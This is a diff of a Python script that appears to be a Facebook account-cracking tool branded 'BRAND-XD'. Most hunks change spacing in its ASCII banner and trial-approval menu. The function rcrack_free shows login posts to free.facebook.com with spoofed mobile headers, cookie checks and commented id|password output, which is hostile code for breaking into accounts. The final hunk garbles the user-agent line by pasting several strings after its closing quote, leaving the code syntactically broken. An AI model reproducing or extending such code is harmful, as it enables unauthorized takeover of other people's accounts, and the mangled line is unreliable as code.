@@ -71,7 +71,7 @@ def menu_apikey():
  
   os.system(f" clear")                          
   print(f"""\x1b[1;97m
- .########..########.....###....##....##.########.
+  .########..########.....###....##....##.########.
  .##.....##.##.....##...##.##...###...##.##.....##
  .##.....##.##.....##..##...##..####..##.##.....##
  .########..########..##.....##.##.##.##.##.....##
@@ -81,8 +81,8 @@ def menu_apikey():
 \033[91;1m--------------------------------------------------
 \033[97;1m>>     Owner    : BRAND-XD
 \033[97;1m>>     Facebook : MEHEDI HASAN TONU
-\033[97;1m>>     Version  : \33[1;91m 0.0.2
-\033[97;1m>>     Tools    : BRAND-PRO
+\033[97;1m>>     Version  : 0.0.2
+\033[97;1m>>     Tools  : BRAND-PRO
 \033[92;1m>>     ToolTyp  : \x1b[91;1m TRIAL 
 \033[91;1m--------------------------------------------------""")
   print(f"\t \033[1;32m  FIRST GET APPROVEL\033[1;37m ")
@@ -120,7 +120,7 @@ def menu_apikey():
     	menu_apikey()
 #menu_apikey()
 logo=(f"""
- .########..########.....###....##....##.########.
+.########..########.....###....##....##.########.
  .##.....##.##.....##...##.##...###...##.##.....##
  .##.....##.##.....##..##...##..####..##.##.....##
  .########..########..##.....##.##.##.##.##.....##
@@ -130,8 +130,8 @@ logo=(f"""
 \033[91;1m--------------------------------------------------
 \033[97;1m>>     Owner    : BRAND-XD
 \033[97;1m>>     Facebook : MEHEDI HASAN TONU
-\033[97;1m>>     Version  : \33[1;91m 0.0.2
-\033[97;1m>>     Tools.   : BRAND-PRO
+\033[97;1m>>     Version  :  \33[1;91m 0.0.2
+\033[97;1m>>     Tools  : BRAND-PRO
 \033[92;1m>>     ToolTyp  : \x1b[91;1m TRIAL 
 \033[91;1m--------------------------------------------------""")
 def linex():
@@ -713,7 +713,7 @@ def rcrack_free(idf,pwv):
 			'sec-fetch-site': 'none',
 			'sec-fetch-user': '?1',
 			'upgrade-insecure-requests': '1',
-			'user-agent':'Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/110.0 Mobile/15E148 Safari/605.1.15'}
+			'user-agent':'Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/110.0 Mobile/15E148 Safari/605.1.15'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5 Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/110.0.5481.114 Mobile/15E148 Safari/604.1 Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36 Mozilla/5.0 (Linux; U; Android 12; id-id; Redmi Note 10 Pro Build/SKQ1.210908.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/AADC05183421'}
 			lo = session.post('https://free.facebook.com/profile.php?eav=Afb9YVDAmNCB4q1oB8UYYmaZ2d4SvTmGgCQTz2uUE8DDOD_40KvLD1lVXnxRgLBMRk4&v=info&ref_component=mfreebasic_home_header&ref_page=/wap/home.php&refid=7&paipv=0',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 			#print(iid+'|'+pws+'|'+str(log_cookies))
